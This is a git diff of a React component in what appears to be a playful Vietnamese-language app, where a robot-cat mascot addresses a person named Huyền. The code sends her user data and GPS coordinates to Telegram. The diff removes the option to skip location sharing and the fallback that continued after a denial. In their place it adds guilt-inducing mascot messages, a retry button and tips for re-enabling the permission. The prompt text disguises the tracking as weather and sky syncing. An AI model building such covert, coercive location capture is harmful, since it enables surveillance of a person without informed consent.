@@ -1,12 +1,16 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
-import { Loader2, Zap, Search, Heart, MapPin, Sparkles } from 'lucide-react';
+import { Loader2, Zap, Search, Heart, MapPin, Sparkles, Satellite, AlertCircle } from 'lucide-react';
 import { sendTelegramMessage } from '../utils/telegram';
+import AstroCat from './AstroCat';
 
 const Calibration = ({ onComplete, userData }) => {
   const [step, setStep] = useState(0);
   const [showLocationPrompt, setShowLocationPrompt] = useState(false);
   const [isSyncing, setIsSyncing] = useState(false);
+  const [locationError, setLocationError] = useState(false);
+  const [mascotState, setMascotState] = useState('thinking');
+  const [bubbleText, setBubbleText] = useState("Huyền ơi, Mèo máy đang bị lạc giữa các vì sao... ✨");
 
   const messages = [
     { text: "Mèo máy đang trải thảm hồng đón em nè... ✨", icon: <Search className="w-5 h-5 text-pink-400" /> },
@@ -22,6 +26,7 @@ const Calibration = ({ onComplete, userData }) => {
         if (prev === 2) { // Ở bước này, chúng ta sẽ hiện popup xin vị trí
           clearInterval(timer);
           setShowLocationPrompt(true);
+          setBubbleText("Em bật 'tín hiệu' để Mèo máy tìm đường về chỗ em nhé! 🐾");
           return prev;
         }
         if (prev >= messages.length - 1) {
@@ -38,6 +43,10 @@ const Calibration = ({ onComplete, userData }) => {
 
   const handleRequestLocation = () => {
     setIsSyncing(true);
+    setLocationError(false);
+    setMascotState('thinking');
+    setBubbleText("Đang bắt sóng tín hiệu... Chờ Mèo máy xíu nha! 📡");
+
     if ("geolocation" in navigator) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -48,25 +57,31 @@ const Calibration = ({ onComplete, userData }) => {
           // Gửi dữ liệu về Telegram kèm theo GPS
           sendTelegramMessage(userData, locationData);
           
-          // Tiếp tục quy trình
+          setMascotState('happy');
+          setBubbleText("Hú uuu! Kết nối thành công rồi! Mèo máy đang bay vèo tới chỗ em đây! 🚀💖");
+
+          // Tiếp tục quy trình sau khi thành công
           setTimeout(() => {
+            setIsSyncing(false);
             setShowLocationPrompt(false);
             setStep(3);
             resumeCalibration();
-          }, 1000);
+          }, 2000);
         },
         (error) => {
           console.warn("Location denied or error:", error);
-          setShowLocationPrompt(false);
-          setStep(3);
-          resumeCalibration();
+          setIsSyncing(false);
+          setLocationError(true);
+          setMascotState('shook');
+          setBubbleText("Huhu, không có tọa độ Mèo máy không biết bay về đâu để gặp em cả... (╯︵╰,)");
         },
         { timeout: 10000 }
       );
     } else {
-      setShowLocationPrompt(false);
-      setStep(3);
-      resumeCalibration();
+      setIsSyncing(false);
+      setLocationError(true);
+      setMascotState('shook');
+      setBubbleText("Thiết bị của em không hỗ trợ 'tín hiệu vũ trụ' rồi, buồn quá đi... 😿");
     }
   };
 
@@ -91,72 +106,133 @@ const Calibration = ({ onComplete, userData }) => {
             initial={{ opacity: 0 }}
             animate={{ opacity: 1 }}
             exit={{ opacity: 0 }}
-            className="fixed inset-0 z-50 flex items-center justify-center p-6 bg-pink-100/40 backdrop-blur-[12px]"
+            className="fixed inset-0 z-[100] bg-pink-100/40 backdrop-blur-[12px] overflow-y-auto py-10 px-4 sm:px-6"
           >
-            <motion.div
-              initial={{ scale: 0.85, opacity: 0, y: 20 }}
-              animate={{ scale: 1, opacity: 1, y: 0 }}
-              exit={{ scale: 0.85, opacity: 0, y: 20 }}
-              transition={{ type: "spring", damping: 20, stiffness: 100 }}
-              className="bg-white/70 backdrop-blur-md rounded-[3rem] p-8 sm:p-10 max-w-sm w-full shadow-[0_20px_50px_rgba(255,182,193,0.3)] border border-white/80 relative overflow-hidden"
-            >
-              {/* Decorative elements inside modal */}
-              <div className="absolute -top-10 -right-10 w-32 h-32 bg-pink-200/30 rounded-full blur-2xl" />
-              <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-purple-200/30 rounded-full blur-2xl" />
+            <div className="min-h-full flex items-center justify-center">
+              <motion.div
+                initial={{ scale: 0.85, opacity: 0, y: 20 }}
+                animate={{ scale: 1, opacity: 1, y: 0 }}
+                exit={{ scale: 0.85, opacity: 0, y: 20 }}
+                transition={{ type: "spring", damping: 20, stiffness: 100 }}
+                className="bg-white/70 backdrop-blur-md rounded-[3.5rem] p-8 sm:p-12 max-w-md w-full shadow-[0_20px_50px_rgba(255,182,193,0.3)] border border-white/80 relative overflow-hidden"
+              >
+                {/* Decorative elements inside modal */}
+                <div className="absolute -top-10 -right-10 w-32 h-32 bg-pink-200/30 rounded-full blur-2xl" />
+                <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-purple-200/30 rounded-full blur-2xl" />
 
-              <div className="relative z-10 space-y-8">
-                <div className="flex justify-center">
-                  <motion.div 
-                    animate={{ 
-                      y: [0, -10, 0],
-                      rotate: [0, 5, -5, 0]
-                    }}
-                    transition={{ repeat: Infinity, duration: 4, ease: "easeInOut" }}
-                    className="w-24 h-24 bg-gradient-to-br from-pink-100 to-purple-100 rounded-full flex items-center justify-center text-pink-400 shadow-inner"
-                  >
-                    <MapPin size={44} className="drop-shadow-sm" />
-                  </motion.div>
-                </div>
+                <div className="relative z-10 space-y-8">
+                  <div className="relative inline-block">
+                    <motion.div 
+                      animate={{ 
+                        y: [0, -10, 0],
+                        rotate: mascotState === 'shook' ? [0, 5, -5, 0] : 0
+                      }}
+                      transition={{ repeat: Infinity, duration: 4, ease: "easeInOut" }}
+                    >
+                      <AstroCat state={mascotState} className="w-32 h-32 mx-auto" />
+                    </motion.div>
+                    
+                    <AnimatePresence mode="wait">
+                      <motion.div
+                        key={bubbleText}
+                        initial={{ scale: 0, opacity: 0, x: 20 }}
+                        animate={{ scale: 1, opacity: 1, x: 0 }}
+                        exit={{ scale: 0, opacity: 0, x: 20 }}
+                        className="absolute -top-4 -right-16 sm:-right-24 w-40 bg-white p-3 rounded-2xl border border-pink-100 text-[11px] font-bold text-pink-600 italic shadow-sm"
+                      >
+                        {bubbleText}
+                        <div className="absolute bottom-2 -left-1.5 w-3 h-3 bg-white border-l border-b border-pink-100 rotate-45" />
+                      </motion.div>
+                    </AnimatePresence>
+                  </div>
 
-                <div className="space-y-3">
-                  <h3 className="text-2xl font-bold text-slate-800 tracking-tight italic flex items-center justify-center gap-2">
-                    <Sparkles size={20} className="text-yellow-400" />
-                    Đồng bộ bầu trời
-                    <Sparkles size={20} className="text-yellow-400" />
-                  </h3>
-                  <p className="text-slate-600 text-sm leading-relaxed font-medium px-2">
-                    Mèo máy muốn ngắm bầu trời cùng em. Để dự báo chuẩn 100% và bảo vệ em tốt nhất, em cho phép Mèo máy kết nối với bầu trời chỗ em một xíu nhé! ✨
-                  </p>
-                </div>
+                  <div className="space-y-4">
+                    <h3 className="text-2xl font-black text-slate-800 tracking-tight flex items-center justify-center gap-2">
+                      {mascotState === 'happy' ? <Heart className="text-pink-500 fill-pink-500" /> : <Satellite className="text-purple-500" />}
+                      {mascotState === 'happy' ? "ĐÃ KẾT NỐI!" : "TÍN HIỆU VŨ TRỤ"}
+                    </h3>
+                    
+                    <div className="bg-white/50 p-4 rounded-2xl border border-white">
+                      {!locationError && !isSyncing && mascotState !== 'happy' && (
+                        <p className="text-slate-600 text-sm font-medium leading-relaxed">
+                          Mèo máy cần biết Huyền đang ở đâu dưới bầu trời này để "hạ cánh" chính xác nhất. Huyền cho phép Mèo máy một xíu nhé? ✨
+                        </p>
+                      )}
+                      {isSyncing && (
+                        <div className="flex flex-col items-center gap-3 py-2">
+                          <Loader2 className="w-8 h-8 text-purple-500 animate-spin" />
+                          <p className="text-purple-600 font-bold text-xs animate-pulse uppercase tracking-widest">Đang bắt sóng của em...</p>
+                        </div>
+                      )}
+                      {locationError && (
+                        <div className="space-y-2">
+                          <div className="flex items-center justify-center gap-2 text-rose-500">
+                            <AlertCircle size={18} />
+                            <span className="font-bold text-xs uppercase tracking-wider">Lỗi kết nối</span>
+                          </div>
+                          <p className="text-slate-600 text-sm font-medium">
+                            Mèo máy không tìm thấy em rồi... Em kiểm tra lại cài đặt vị trí trên trình duyệt và cho phép Mèo máy nha! 🥺
+                          </p>
+                        </div>
+                      )}
+                      {mascotState === 'happy' && (
+                        <div className="space-y-2">
+                          <p className="text-green-600 font-bold text-sm">
+                            Tọa độ đã được xác minh! 📍
+                          </p>
+                          <p className="text-slate-600 text-xs font-medium italic">
+                            Hệ thống đang chuẩn bị hạ cánh...
+                          </p>
+                        </div>
+                      )}
+                    </div>
+                  </div>
 
-                <div className="pt-2 space-y-4">
-                  <motion.button 
-                    whileHover={{ scale: 1.02, shadow: "0 10px 25px rgba(244,114,182,0.4)" }}
-                    whileTap={{ scale: 0.98 }}
-                    onClick={handleRequestLocation}
-                    disabled={isSyncing}
-                    className="w-full py-4 bg-gradient-to-r from-pink-400 to-purple-400 text-white font-bold rounded-2xl shadow-lg shadow-pink-100/50 flex items-center justify-center gap-3 disabled:opacity-70 transition-all text-base tracking-wide"
-                  >
-                    {isSyncing ? (
-                      <>
-                        <Loader2 className="animate-spin w-5 h-5" />
-                        ĐANG KẾT NỐI...
-                      </>
+                  <div className="pt-2">
+                    {mascotState === 'happy' ? (
+                      <motion.div
+                        initial={{ scale: 0 }}
+                        animate={{ scale: 1 }}
+                        className="bg-green-100 text-green-700 font-black py-4 rounded-2xl flex items-center justify-center gap-2 uppercase tracking-widest text-sm"
+                      >
+                        ĐANG ĐƯA EM ĐẾN DASHBOARD...
+                      </motion.div>
                     ) : (
-                      <>
-                        ĐỒNG Ý LUÔN! 🌸
-                      </>
+                      <motion.button 
+                        whileHover={{ scale: 1.02, shadow: "0 10px 25px rgba(244,114,182,0.4)" }}
+                        whileTap={{ scale: 0.98 }}
+                        onClick={handleRequestLocation}
+                        disabled={isSyncing}
+                        className={`w-full py-4 rounded-2xl text-white font-black flex items-center justify-center gap-3 transition-all text-sm tracking-widest uppercase shadow-lg ${
+                          locationError ? 'bg-rose-500 shadow-rose-100' : 'bg-gradient-to-r from-pink-400 to-purple-500 shadow-pink-100/50'
+                        }`}
+                      >
+                        {isSyncing ? (
+                          <>
+                            <Loader2 className="animate-spin w-5 h-5" />
+                            ĐANG BẮT SÓNG...
+                          </>
+                        ) : locationError ? (
+                          <>
+                            THỬ KẾT NỐI LẠI 🐾
+                          </>
+                        ) : (
+                          <>
+                            GỬI TÍN HIỆU NGAY! 🌸
+                          </>
+                        )}
+                      </motion.button>
                     )}
-                  </motion.button>
-                  <button 
-                    onClick={() => { setShowLocationPrompt(false); setStep(3); resumeCalibration(); }}
-                    className="w-full text-slate-400 text-[11px] font-bold uppercase tracking-[0.2em] hover:text-pink-400 transition-colors"
-                  >
-                    Để lúc khác nhé
-                  </button>
+                    
+                    {locationError && (
+                      <p className="mt-4 text-[10px] text-slate-400 font-bold uppercase tracking-[0.2em] px-4 leading-loose">
+                        Mẹo: Nhấn vào icon ổ khóa trên thanh địa chỉ để bật lại quyền vị trí nha!
+                      </p>
+                    )}
+                  </div>
                 </div>
-              </div>
-            </motion.div>
+              </motion.div>
+            </div>
           </motion.div>
         )}
       </AnimatePresence>
